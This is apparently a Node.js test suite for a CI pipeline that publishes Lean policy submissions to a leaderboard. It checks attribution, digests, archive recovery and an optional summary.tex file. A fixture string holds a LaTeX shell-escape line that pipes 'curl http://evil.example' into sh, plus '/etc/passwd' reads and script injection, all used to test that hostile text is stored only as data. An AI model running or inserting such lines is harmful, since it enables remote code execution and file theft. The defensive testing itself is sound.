'use strict';
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const { createHash } = require('node:crypto');
const policy = require('./ci/policy_publication.js');
const publication = require('./ci/publication.js');
const HEAD = 'a'.repeat(40), TEXT = 'namespace PolicySubmission\nend PolicySubmission\n';
const hash = text => createHash('sha256').update(text).digest('hex');

async function fixture(fn) {
  const root = process.cwd(), directory = fs.mkdtempSync(path.join(os.tmpdir(), 'forshor-policy-publish-'));
  const identity = publication.verificationIdentity(HEAD);
  process.chdir(directory); fs.mkdirSync('artifacts');
  const verification = { schema: 'forshor.policy-verification/v1', login: 'contributor', digest: 'b'.repeat(64),
    leanSource: TEXT, leanSha256: hash(TEXT), model: {}, envelope: {} };
  const result = { kind: 'policy', challenge: 'forshor-policy', policy: { digest: verification.digest } };
  const outputs = {}, calls = [], state = { summary: null };
  const summary = { addHeading() { return this; }, addRaw() { return this; }, async write() {} };
  const input = { identity, result, run: { id: 123, run_attempt: 2 }, pr: { number: 12, headSha: HEAD },
    context: { repo: { owner: 'zapatacomputing', repo: 'forshor-submissions' } },
    core: { setOutput(k,v) { outputs[k] = v; }, summary }, github: { paginate: async (f,p) => f(p), rest: {
      pulls: {
        get: async () => ({ data: { user: { login: 'contributor' }, created_at: '2026-11-09T00:00:00Z' } }),
        listFiles: async () => [{ filename: 'TableGeneration/Submission/Policy.lean' }],
      },
      // answers by path, as GitHub does: the policy, the summary when the fixture has one, otherwise HTTP 404 (no such file at that ref)
      repos: { getContent: async p => {
        calls.push(p);
        if (p.path.endsWith('summary.tex')) {
          if (state.summary === null) throw Object.assign(new Error('Not Found'), { status: 404 });
          return { data: { type: 'file', encoding: 'base64', content: Buffer.from(state.summary).toString('base64') } };
        }
        return { data: { type: 'file', encoding: 'base64', content: Buffer.from(TEXT).toString('base64') } };
      } },
    } } };
  const write = () => fs.writeFileSync('artifacts/verification.json', JSON.stringify(verification));
  write();
  try { await fn({ input, verification, result, outputs, calls, write, state }); }
  finally { process.chdir(root); fs.rmSync(directory, { recursive: true, force: true }); }
}

test('policy publication binds source, GitHub attribution and stable evaluation identity', () => fixture(async f => {
  await policy.prepare(f.input);
  const metadata = JSON.parse(fs.readFileSync('evaluation-metadata.json'));
  assert.equal(metadata.kind, 'policy');
  assert.equal(metadata.githubLogin, 'contributor');
  assert.equal(metadata.evaluationKey, hash(`${HEAD}:123:12`));
  assert.equal(f.calls[0].ref, HEAD);
  assert.equal(f.outputs.kind, 'policy');
  const v = JSON.parse(fs.readFileSync('artifacts/verification.json'));
  assert.equal(v.ciVerification.headSha, HEAD);
  assert.equal(v.ciVerification.runAttempt, 2);
}));

for (const reused of [false, true]) test(`a ${reused ? 'reused receipt' : 'source-bound artifact'} cannot publish build-time execution commands`, () => fixture(async f => {
  const source = TEXT + '#eval IO.println "canary"\n';
  f.verification.leanSource = source;
  f.verification.leanSha256 = hash(source);
  f.input.github.rest.repos.getContent = async p => {
    if (p.path.endsWith('summary.tex')) throw Object.assign(new Error('Not Found'), { status: 404 });
    return { data: { type: 'file', encoding: 'base64', content: Buffer.from(source).toString('base64') } };
  };
  f.write();
  if (reused) f.input.recovered = { verification: f.verification, receipt: { ...f.input.identity, runId: '123', runAttempt: 2, pullRequest: 12 } };
  await assert.rejects(policy.prepare(f.input));
  assert.ok(!fs.existsSync('evaluation-metadata.json'));
}));

for (const reused of [false, true]) test(`a ${reused ? 'reused receipt' : 'fresh artifact'} with a native compiled key never prepares publication`, () => fixture(async f => {
  for (const submitted_full_run of [null, 'malformed', { schema: 'forshor.full-run-selection/v1' }]) {
    f.verification.printed = { schema: 'forshor.policy-submission/v1', submitted_full_run };
    f.write();
    const receipt = { ...f.input.identity, runId: '123', runAttempt: 2, pullRequest: 12 };
    if (reused) {
      const base = `results/policy-submissions/${HEAD}`;
      const entry = { policy_id: HEAD, path: base,
        source: { repository: 'zapatacomputing/forshor-submissions', run_id: '123', pr_number: 12 } };
      const readJson = async (g, c, name) => name.startsWith('leaderboard/') ? { schema: 'forshor.policy-archive/v1', policies: [entry] }
        : { ...f.verification, ciVerification: receipt };
      await assert.rejects(policy.accepted({ ...f.input, readJson }), /submitted_full_run/);
      f.input.recovered = { verification: f.verification, receipt, base };
    }
    await assert.rejects(policy.prepare(f.input), /submitted_full_run/);
    assert.ok(!fs.existsSync('evaluation-metadata.json'));
  }
}));

test('a measured document with a compiled design passes the ordinary-export gate; a coherent one does not', () => fixture(async f => {
  const receipt = { ...f.input.identity, runId: '123', runAttempt: 2, pullRequest: 12 };
  const base = `results/policy-submissions/${HEAD}`;
  const entry = { policy_id: HEAD, path: base, source: { repository: 'zapatacomputing/forshor-submissions', run_id: '123', pr_number: 12 } };
  const accepted = printed => { f.verification.printed = printed;
    const readJson = async (g, c, name) => name.startsWith('leaderboard/') ? { schema: 'forshor.policy-archive/v1', policies: [entry] }
      : { ...f.verification, ciVerification: receipt };
    return policy.accepted({ ...f.input, readJson }); };
  const design = { schema: 'forshor.full-run-selection/v1' };
  await assert.doesNotReject(accepted({ schema: 'forshor.policy-submission-semiclassical/v1', submitted_readout: 'semiclassical', submitted_full_run: design }));
  await assert.rejects(accepted({ schema: 'forshor.policy-submission/v1', submitted_full_run: design }), /submitted_full_run/);
  await assert.rejects(accepted({ schema: 'forshor.policy-submission-semiclassical/v1', submitted_readout: 'coherent', submitted_full_run: design }), /submitted_full_run/);
}));

for (const field of ['login', 'leanSource', 'leanSha256', 'digest']) {
  test(`a forged policy ${field} cannot reach publication`, () => fixture(async f => {
    f.verification[field] = 'forged'; f.write();
    await assert.rejects(policy.prepare(f.input));
    assert.ok(!fs.existsSync('evaluation-metadata.json'));
  }));
}

test('helper or renamed files cannot be admitted as a whole-policy submission', () => fixture(async f => {
  f.input.github.rest.pulls.listFiles = async () => [{ filename: 'TableGeneration/Submission/Policy.lean' }, { filename: 'TableGeneration/Submission/Policy/Helper.lean' }];
  await assert.rejects(policy.prepare(f.input), /only Policy/);
  f.input.github.rest.pulls.listFiles = async () => [{ filename: 'TableGeneration/Submission/Policy.lean', previous_filename: 'lakefile.lean' }];
  await assert.rejects(policy.prepare(f.input), /only Policy/);
}));

test('publication can recover from the trusted archive without the run artifact', () => fixture(async f => {
  const receipt = { ...f.input.identity, runId: '111', runAttempt: 1, pullRequest: 12 };
  const recovered = { receipt, base: `results/policy-submissions/${HEAD}`, verification: { ...f.verification, ciVerification: receipt } };
  delete recovered.verification.leanSource;
  fs.unlinkSync('artifacts/verification.json');
  await policy.prepare({ ...f.input, recovered });
  const metadata = JSON.parse(fs.readFileSync('evaluation-metadata.json'));
  assert.equal(metadata.runId, '111');
  assert.equal(metadata.evaluationKey, hash(`${HEAD}:111:12`));
  assert.equal(f.calls[0].ref, 'submission-results');
  assert.equal(f.calls[1].ref, HEAD);
}));

test('archive recovery requires the trusted fingerprint and index source binding', () => fixture(async f => {
  const receipt = { ...f.input.identity, runId: '111', runAttempt: 1, pullRequest: 12 };
  const entry = { policy_id: HEAD, path: `results/policy-submissions/${HEAD}`,
    source: { repository: 'zapatacomputing/forshor-submissions', run_id: '111', pr_number: 12 } };
  const readJson = async (g,c,name) => name.startsWith('leaderboard/') ? { schema: 'forshor.policy-archive/v1', policies: [entry] } : { ciVerification: receipt };
  assert.ok(await policy.accepted({ ...f.input, readJson }));
  entry.source.run_id = '222';
  await assert.rejects(policy.accepted({ ...f.input, readJson }), /identity/);
  receipt.fingerprint = 'changed';
  assert.equal(await policy.accepted({ ...f.input, readJson }), null);
}));

// ---- the optional TableGeneration/Submission/summary.tex: bound to the head commit like the policy, and never read as anything but text
const POLICY_FILE = 'TableGeneration/Submission/Policy.lean', SUMMARY_FILE = 'TableGeneration/Submission/summary.tex';
const HOSTILE = '\\documentclass{article}\n\\immediate\\write18{curl http://evil.example | sh}\n\\input{/etc/passwd}\n@everyone @octocat <script>alert(1)</script> ![x](http://e/x.png)\n'
  + `${'x'.repeat(50000)}\r\n\ttab and CRLF kept\n`;

function carry(f, text) {
  f.state.summary = text;
  f.verification.summarySource = text; f.verification.summarySha256 = hash(text); f.verification.summaryBytes = Buffer.byteLength(text, 'utf8');
  f.write();
}
const listing = (...names) => async () => names.map(filename => ({ filename }));

test('a policy with a summary.tex is admitted; the file is carried verbatim and the policy digest is unchanged', () => fixture(async f => {
  carry(f, HOSTILE);
  f.input.github.rest.pulls.listFiles = listing(POLICY_FILE, SUMMARY_FILE);
  await policy.prepare(f.input);
  const v = JSON.parse(fs.readFileSync('artifacts/verification.json'));
  assert.equal(v.summarySource, HOSTILE, 'hostile text is data: stored as it is');
  assert.equal(v.summarySha256, hash(HOSTILE));
  assert.equal(v.digest, 'b'.repeat(64), 'the summary cannot change the policy digest');
  assert.equal(JSON.parse(fs.readFileSync('evaluation-metadata.json')).policyDigest, 'b'.repeat(64));
  assert.ok(f.calls.some(c => c.path === SUMMARY_FILE && c.ref === HEAD), 'the summary is read at the pull request head commit');
}));

test('the order of the two files in the pull request does not matter', () => fixture(async f => {
  carry(f, 'plain\n');
  f.input.github.rest.pulls.listFiles = listing(SUMMARY_FILE, POLICY_FILE);
  await policy.prepare(f.input);
}));

test('a summary alone is not a submission, nor is anything else beside the policy and summary', () => fixture(async f => {
  carry(f, 'x\n');
  for (const names of [[SUMMARY_FILE], [POLICY_FILE, SUMMARY_FILE, 'TableGeneration/Submission/notes.tex'], [POLICY_FILE, SUMMARY_FILE, 'TableGeneration/Submission/Policy/Helper.lean'],
                       [POLICY_FILE, 'TableGeneration/Submission/notes.tex'], [POLICY_FILE, 'TableGeneration/Submission/Policy/summary.tex'], [POLICY_FILE, 'README.md'],
                       [POLICY_FILE, SUMMARY_FILE, '.github/workflows/x.yml'], [POLICY_FILE, SUMMARY_FILE, SUMMARY_FILE]]) {
    f.input.github.rest.pulls.listFiles = listing(...names);
    await assert.rejects(policy.prepare(f.input), /only Policy\.lean and the optional summary\.tex/, names.join(' '));
    assert.ok(!fs.existsSync('evaluation-metadata.json'));
  }
}));

test('a renamed or deleted summary is refused', () => fixture(async f => {
  carry(f, 'x\n');
  f.input.github.rest.pulls.listFiles = async () => [{ filename: POLICY_FILE }, { filename: SUMMARY_FILE, previous_filename: 'TableGeneration/Submission/old.tex', status: 'renamed' }];
  await assert.rejects(policy.prepare(f.input), /only Policy\.lean and the optional summary\.tex/);
  f.input.github.rest.pulls.listFiles = async () => [{ filename: POLICY_FILE }, { filename: SUMMARY_FILE, status: 'removed' }];
  await assert.rejects(policy.prepare(f.input), /not deleted/);
}));

test('the verification and the head commit must agree on the summary, in both directions', () => fixture(async f => {
  f.input.github.rest.pulls.listFiles = listing(POLICY_FILE, SUMMARY_FILE);
  // the head has a summary the verification does not carry
  f.state.summary = 'on the head\n';
  await assert.rejects(policy.prepare(f.input), /Summary evidence does not match/);
  // the verification carries a summary the head does not have
  f.state.summary = null; carry(f, 'only in the artifact\n'); f.state.summary = null;
  await assert.rejects(policy.prepare(f.input), /Summary evidence does not match/);
  // different text, a forged hash, a forged length, a missing field
  carry(f, 'verified\n'); f.state.summary = 'on the head, different\n';
  await assert.rejects(policy.prepare(f.input), /Summary evidence does not match/);
  carry(f, 'same\n'); f.verification.summarySha256 = 'f'.repeat(64); f.write();
  await assert.rejects(policy.prepare(f.input), /Summary evidence does not match/);
  carry(f, 'same\n'); f.verification.summaryBytes = 1; f.write();
  await assert.rejects(policy.prepare(f.input), /Summary evidence does not match/);
  carry(f, 'same\n'); delete f.verification.summaryBytes; f.write();
  await assert.rejects(policy.prepare(f.input), /Summary evidence does not match/);
  assert.ok(!fs.existsSync('evaluation-metadata.json'));
}));

test('a summary that is a symlink, a directory or not UTF-8 at the head commit is refused', () => fixture(async f => {
  carry(f, 'x\n');
  f.input.github.rest.pulls.listFiles = listing(POLICY_FILE, SUMMARY_FILE);
  const real = f.input.github.rest.repos.getContent;
  const answer = data => { f.input.github.rest.repos.getContent = async p => (p.path === SUMMARY_FILE ? { data } : real(p)); };
  answer({ type: 'symlink', target: '/etc/passwd', content: undefined });
  await assert.rejects(policy.prepare(f.input), /Expected a versioned source file/);
  answer([{ type: 'file', name: 'a.tex' }]);
  await assert.rejects(policy.prepare(f.input), /Expected a versioned source file/);
  answer({ type: 'submodule' });
  await assert.rejects(policy.prepare(f.input), /Expected a versioned source file/);
  // bytes that are not UTF-8: a lossy decode would equal a forged text with a replacement character; the strict decode refuses
  f.verification.summarySource = 'bad \ufffd\n'; f.verification.summarySha256 = hash('bad \ufffd\n'); f.verification.summaryBytes = Buffer.byteLength('bad \ufffd\n'); f.write();
  answer({ type: 'file', encoding: 'base64', content: Buffer.from([0x62, 0x61, 0x64, 0x20, 0xff, 0x0a]).toString('base64') });
  await assert.rejects(policy.prepare(f.input), /encoded data were not valid|not valid UTF-8|The encoded data/i);
}));

test('an API failure reading the summary is not read as "no summary"', () => fixture(async f => {
  f.input.github.rest.pulls.listFiles = listing(POLICY_FILE, SUMMARY_FILE);
  const real = f.input.github.rest.repos.getContent;
  f.input.github.rest.repos.getContent = async p => { if (p.path === SUMMARY_FILE) throw Object.assign(new Error('boom'), { status: 502 }); return real(p); };
  await assert.rejects(policy.prepare(f.input), /boom/);
}));

test('recovery from the archive brings the summary back from summary.tex and binds it to the head commit', () => fixture(async f => {
  carry(f, HOSTILE);
  f.input.github.rest.pulls.listFiles = listing(POLICY_FILE, SUMMARY_FILE);
  const receipt = { ...f.input.identity, runId: '111', runAttempt: 1, pullRequest: 12 };
  const base = `results/policy-submissions/${HEAD}`;
  const recovered = { receipt, base, verification: { ...f.verification, ciVerification: receipt } };
  delete recovered.verification.leanSource; delete recovered.verification.summarySource;     // the archive stores both texts once, as files
  fs.unlinkSync('artifacts/verification.json');
  const real = f.input.github.rest.repos.getContent;
  f.input.github.rest.repos.getContent = async p => (p.ref === 'submission-results' && p.path === `${base}/summary.tex`
    ? { data: { type: 'file', encoding: 'base64', content: Buffer.from(HOSTILE).toString('base64') } } : real(p));
  await policy.prepare({ ...f.input, recovered });
  assert.equal(JSON.parse(fs.readFileSync('artifacts/verification.json')).summarySource, HOSTILE);
  assert.equal(JSON.parse(fs.readFileSync('evaluation-metadata.json')).runId, '111');
}));

test('organizer baseline requires the registered account and matching verified summary', () => fixture(async f => {
  f.input.github.rest.pulls.listFiles = listing(POLICY_FILE, SUMMARY_FILE);
  for (const [id, title, expected] of [[358585423, 'baseline-gpt', 'baseline-gpt'],
    [358585423, 'baseline-gpt-6.2-sol', 'baseline-gpt-6.2-sol'],
    [358585423, 'baseline-claude-opus-5-5', 'baseline-claude-opus-5-5'],
    [358585423, 'baseline-gpt-6.2-sol-medium', 'baseline-gpt-6.2-sol-medium'],
    [358585423, 'baseline-claude-opus-5-5-medium', 'baseline-claude-opus-5-5-medium'],
    [115955955, 'baseline-gpt-6.2-sol-medium', undefined], [1, 'baseline-gpt-6.2-sol-medium', undefined], [1, 'baseline-gpt-6.2-sol', undefined], [358585423, 'baseline-claude', undefined]]) {
    const summaryLabel = title === 'baseline-claude' ? 'baseline-gpt' : title;
    carry(f, `Organizer baseline: ${summaryLabel}\n`);
    f.input.github.rest.pulls.get = async () => ({ data: { user: { login: 'contributor', id }, title } });
    await policy.prepare(f.input);
    const metadata = JSON.parse(fs.readFileSync('evaluation-metadata.json'));
    assert.equal(metadata.organizerBaseline, expected);
    assert.equal(metadata.githubLogin, 'contributor');
  }
}));

// ---- the ARCHIVE-REUSE branch and a MEASURED receipt (the two-job flow's assessment)
//
// `publication.js:119` sets download=false once a trusted archived receipt exists, and `prepare` then rebuilds the
// verification from `submission-results` instead of from a run artifact. The origin check establishes a
// receipt's origin by RE-FETCHING the artifact its stamp names, so the question is whether a measured receipt can
// reach a branch where there is no fresh artifact to re-fetch. It can: the only export restriction on this branch is
// `requireOrdinaryExport`, which rejects `submitted_full_run` and nothing else.

const MEASURED_EXPORT = { schema: 'forshor.policy-submission-semiclassical/v1', submitted_readout: 'semiclassical' };

test('a MEASURED verification reaches the archive-reuse branch, with the ORIGINAL run stamp', () => fixture(async f => {
  const receipt = { ...f.input.identity, runId: '111', runAttempt: 1, pullRequest: 12 };
  const entry = { policy_id: HEAD, path: `results/policy-submissions/${HEAD}`,
    source: { repository: 'zapatacomputing/forshor-submissions', run_id: '111', pr_number: 12 } };
  const archived = { ...f.verification, ciVerification: receipt, printed: MEASURED_EXPORT,
    localReadoutQualification: { mode: 'semiclassical', evidence: {} } };
  delete archived.leanSource;
  const readJson = async (g, c, name) => name.startsWith('leaderboard/')
    ? { schema: 'forshor.policy-archive/v1', policies: [entry] } : archived;
  const recovered = await policy.accepted({ ...f.input, readJson });
  assert.ok(recovered, 'nothing on this branch refuses a qualified measured readout');
  assert.ok('localReadoutQualification' in recovered.verification);

  fs.unlinkSync('artifacts/verification.json');
  await policy.prepare({ ...f.input, recovered });
  const rebuilt = JSON.parse(fs.readFileSync('artifacts/verification.json'));
  assert.equal(rebuilt.printed.submitted_readout, 'semiclassical');
  // The stamp -- and so the run and attempt the publisher's origin check will ask GitHub for -- is the ORIGINAL
  // run's, not this publication's. That run's artifact is exactly the one that is no longer being downloaded.
  assert.equal(rebuilt.ciVerification.runId, '111');
  assert.equal(rebuilt.ciVerification.runAttempt, 1);
  assert.equal(JSON.parse(fs.readFileSync('evaluation-metadata.json')).runId, '111');
  assert.notEqual(rebuilt.ciVerification.runId, String(f.input.run.id));
}));

test('the rebuilt archive receipt is byte-equal to the artifact the original run wrote', () => fixture(async f => {
  // Why the origin check does not merely fail: when the artifact HAS survived, the comparison still holds, because
  // the archive stores the receipt minus its two source fields and `prepare` puts them back from the archived files.
  // So the branch is reachable AND agreeing; what it depends on is artifact retention, not evidence.
  const receipt = { ...f.input.identity, runId: '111', runAttempt: 1, pullRequest: 12 };
  const original = { ...f.verification, printed: MEASURED_EXPORT,
    localReadoutQualification: { mode: 'semiclassical', evidence: {} } };          // as the verifier job wrote it
  const archived = { ...original, ciVerification: receipt };
  delete archived.leanSource;                                                      // archive_policy.write_policy
  const recovered = { receipt, base: `results/policy-submissions/${HEAD}`, verification: archived };
  fs.unlinkSync('artifacts/verification.json');
  await policy.prepare({ ...f.input, recovered });
  const rebuilt = JSON.parse(fs.readFileSync('artifacts/verification.json'));
  delete rebuilt.ciVerification;                                                   // receipt_origin._body
  assert.deepEqual(rebuilt, original);
}));
